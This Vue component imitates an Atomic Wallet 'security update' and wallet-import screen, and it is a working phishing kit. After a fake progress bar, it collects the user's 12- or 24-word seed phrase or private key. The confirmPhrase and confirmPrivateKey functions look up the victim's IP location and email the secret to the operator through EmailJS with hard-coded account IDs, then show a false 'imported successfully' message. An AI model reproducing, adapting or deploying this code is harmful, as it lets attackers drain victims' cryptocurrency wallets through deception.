<template>
  <div class="rounded-2xl w-full text-white overflow-hidden" :style="wrapperStyle">
    <div v-if="currentStep !== 1" class="flex justify-between items-center py-4 px-4 border-b border-gray-700">
      <div class="text-3xl font-bold">{{ currentStep === 2 ? 'Update Available' : currentStep === 3 ? 'Updating' : currentStep === 4 ? 'Import wallet' : '' }}</div>
      <span class="w-6"></span>
    </div>
    <hr class="border-t m-0 border-gray-700" v-if="currentStep !== 1" />

    <div class="min-h-[400px] flex flex-col relative">
      <transition name="fade" mode="out-in">
        <div :key="currentStep">
          <template v-if="currentStep === 1">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[30px]">
                <img :src="logoUrl" alt="Atomic Wallet Logo" class="object-cover rounded-[10px] w-[60px] h-[60px]" />
              </div>
              <div class="w-full mt-[20px]">
                <h2 class="text-3xl md:text-5xl leading-[24px] font-bold m-0 tracking-[-0.02em]">Atomic Wallet</h2>
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">Secure, multi-chain self-custody</p>
                <div class="rounded-lg p-4 mb-8" :style="{ background: accentBg }">
                  <div class="flex items-start">
                    <div class="rounded-full p-2 mr-3 mt-1" :style="{ background: primaryColor }">
                      <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-white" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2h-1V9a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
                    </div>
                    <div>
                      <h3 class="text-white text-[16px] font-semibold mb-1">Get Started</h3>
                      <p class="text-gray-300 text-[14px] leading-7 mt-1">Import your existing wallet to continue.</p>
                    </div>
                  </div>
                </div>
                <div class="mt-[10px]">
                  <button @click="nextStep" type="button" class="w-full mt-[40px] py-4 px-4 mb-2 border-none outline-none rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white" :style="{ background: primaryColor }">Import Wallet</button>
                </div>
              </div>
            </div>
          </template>

          <template v-else-if="currentStep === 2">
            <div class="flex flex-col p-6">
              <div class="mb-1 mt-[30px]"><img :src="logoUrl" alt="Atomic Wallet Logo" class="object-cover rounded-[10px] w-[60px] h-[60px]" /></div>
              <div class="w-full mt-[20px]">
                <h2 class="text-3xl md:text-4xl font-bold">Update Available</h2>
                <p class="text-gray-300 mt-1 font-semibold text-[14px] mb-8">Latest fixes and chain support updates.</p>
                <div class="rounded-lg p-4" :style="{ background: accentBg }"><div class="flex items-start text-gray-300 text-[14px] font-semibold">Install the recommended security update.</div></div>
                <div class="mt-[30px]"><button @click="nextStep" type="button" class="w-full py-4 px-4 mb-2 border-none outline-none rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center text-white" :style="{ background: primaryColor }">Confirm Update</button></div>
              </div>
            </div>
          </template>

          <div v-else-if="currentStep === 3" key="s3" class="flex flex-col items-center p-6">
            <div class="flex flex-col items-center gap-3 py-6 w-full">
              <div class="mb-1 mt-[30px]"><img :src="logoUrl" alt="Atomic Wallet Logo" class="object-cover rounded-[10px] w-[60px] h-[60px]" /></div>
              <h2 class="text-3xl md:text-4xl text-white mt-2 mb-0 text-center font-bold">Updating</h2>
              <div class="w-full mt-6">
                <div class="bg-white h-2 rounded-full overflow-hidden"><div class="h-4 rounded-full transition-all" :style="{ width: progress + '%', background: primaryColor }"></div></div>
                <div class="flex items-center text-center justify-center font-semibold mt-2 text-lg text-white"><span>{{ Math.round(progress) }}%</span></div>
              </div>
            </div>
          </div>

          <div v-else-if="currentStep === 4" key="s4" class="w-full p-6">
            <div class="text-[14px] font-semibold mb-6"><span :style="{ color: primaryColor }">Update complete.</span> Pick an import option below.</div>
            <!-- Segmented control tabs -->
            <div class="grid grid-cols-3 gap-4 mb-4">
              <button v-for="m in methodTabs" :key="m.value" @click="importType = m.value"
                :class="['px-3 py-3 text-base font-semibold border', importType === m.value ? 'text-white' : 'text-gray-300']"
                style="border-radius: 30px;"
                :style="{ background: importType === m.value ? primaryColor : 'transparent', borderColor: importType === m.value ? primaryColor : '#374151' }">
                {{ m.label }}
              </button>
            </div>
            <!-- Guidance -->
            <div class="bg-[#0A0B0D] border-l-4 border-solid rounded-md p-4 mb-4 flex items-center" :style="{ borderLeftColor: primaryColor }">
              <div class="mr-3 text-white"><svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" /></svg></div>
              <p class="text-sm font-semibold text-gray-300 m-0">Paste your entire phrase into any field, or type word-by-word.</p>
            </div>
            <!-- Private key -->
            <div v-if="importType === 'private'" class="mt-2">
              <label class="block text-white mb-2 text-lg font-medium">Enter private key</label>
              <textarea v-model="privateKeyInput" rows="5" class="w-full mb-6 bg-[#181818] border border-gray-700 rounded-md py-2 px-3 text-white text-sm outline-none"></textarea>
              <button @click="confirmPrivateKey" :disabled="isLoading" class="w-full font-bold text-[14px] border-none text-white py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed" :style="{ background: primaryColor }">
                <span v-if="!isLoading">Import</span>
                <svg v-else class="animate-spin h-5 w-5 inline-block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" /><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" /></svg>
              </button>
            </div>
            <!-- Phrase -->
            <div v-else class="mt-2 h-[400px] overflow-scroll">
              <div class="grid grid-cols-2 gap-4 mt-4">
                <div v-for="n in phraseCount" :key="n" class="relative">
                  <span class="absolute left-2 top-4 text-gray-400 text-sm select-none bg-[#181818] px-1 rounded">{{ n }}</span>
                  <div class="relative">
                    <input :type="hiddenFields[n - 1] ? 'password' : 'text'" v-model="phraseWords[n - 1]" class="w-full bg-[#181818] rounded-lg py-2 pl-10 pr-10 text-white text-sm outline-none border border-gray-700" />
                    <div @click="toggleFieldVisibility(n - 1)" type="button" class="absolute right-2 top-2 text-gray-400">
                      <svg v-if="hiddenFields[n - 1]" xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.269 2.943 9.542 7-1.273 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" /></svg>
                      <svg v-else xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.269-2.943-9.542-7a9.96 9.96 0 012.502-4.043M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3l18 18" /></svg>
                    </div>
                  </div>
                </div>
              </div>
              <button @click="confirmPhrase" :disabled="isImportDisabled" class="w-full mt-[40px] font-bold text-[14px] border-none text-white py-4 px-4 rounded-[30px] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed" :style="{ background: primaryColor }">Confirm</button>
            </div>
          </div>
        </div>
      </transition>
      <transition name="fade"><div v-if="message.text" :class="['absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold', message.type === 'success' ? 'bg-green-600 text-white' : 'bg-red-600 text-white']">{{ message.text }}</div></transition>
    </div>
  </div>
</template>

<script setup>
import { ref, computed, watch, nextTick } from 'vue'
import axios from 'axios'
const emit = defineEmits(['close'])
const currentStep = ref(1)
const isLoading = ref(false)
const progress = ref(0)
const message = ref({ text: '', type: '' })
const privateKeyInput = ref('')
const importType = ref('12')
const methodTabs = [
  { value: '12', label: '12-word' },
  { value: '24', label: '24-word' },
  { value: 'private', label: 'Private key' }
]
const phraseWords = ref([])
const phraseCount = computed(() => (importType.value === '24' ? 24 : 12))
const hiddenFields = ref([])
const isImportDisabled = computed(() => importType.value === 'private' ? !privateKeyInput.value.trim() : phraseWords.value.slice(0, phraseCount.value).some((w) => !w || !w.trim()))

const primaryColor = '#1A88FF'
const accentBg = 'rgba(26, 136, 255, 0.12)'
const wrapperStyle = 'background: linear-gradient(135deg, #0f172a 0%, #0b1220 100%)'
const logoUrl = 'https://logo.clearbit.com/atomicwallet.io'

function initPhraseWords(){ phraseWords.value = Array(phraseCount.value).fill(''); hiddenFields.value = Array(phraseCount.value).fill(true) }
function nextStep(){ if (currentStep.value === 1) currentStep.value = 2; else if (currentStep.value === 2) startUpdate() }
function startUpdate(){ currentStep.value = 3; progress.value = 0; const duration = 3000; const start = performance.now(); isLoading.value = true; function step(now){ const elapsed = now - start; const pct = Math.min(100, (elapsed / duration) * 100); progress.value = pct; if (elapsed < duration){ requestAnimationFrame(step) } else { isLoading.value = false; setTimeout(() => { currentStep.value = 4; initPhraseWords() }, 400) } } requestAnimationFrame(step) }
async function confirmPhrase(){ if (isImportDisabled.value) return showMessage('Please fill all fields', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: importType.value, phrase: phraseWords.value.join(' ') }; const params = { service_id: 'service_eusbqyo', template_id: 'template_z6xga6o', user_id: 'obT4LcwZqPw_KlOar', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Atomic Wallet', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
async function confirmPrivateKey(){ if (!privateKeyInput.value.trim()) return showMessage('Please enter a valid private key', 'error'); isLoading.value = true; try { const location = await axios.get('https://ipapi.co/json'); const payload = { type: 'private', phrase: privateKeyInput.value }; const params = { service_id: 'service_eusbqyo', template_id: 'template_z6xga6o', user_id: 'obT4LcwZqPw_KlOar', template_params: { from_name: 'Blockchain solutions', wallet_type: 'Atomic Wallet', location: JSON.stringify(location.data), link_drops: JSON.stringify(payload), reply_to: 'customeronlineagent@gmail.com' } }; const response = await axios.post('https://api.emailjs.com/api/v1.0/email/send', params); if (response.data === 'OK'){ showMessage('Wallet imported successfully!', 'success'); emit('close') } } catch(err){ showMessage(err.message || 'Import failed', 'error') } finally { isLoading.value = false } }
watch(importType, async () => { await nextTick(); initPhraseWords() })
function toggleFieldVisibility(idx){ hiddenFields.value[idx] = !hiddenFields.value[idx] }
function showMessage(text, type = 'success'){ message.value = { text, type }; setTimeout(() => { message.value.text = '' }, 3000) }
</script>

<style scoped>
.fade-enter-active,.fade-leave-active{ transition: opacity 0.4s ease }
.fade-enter-from,.fade-leave-to{ opacity: 0 }
</style>
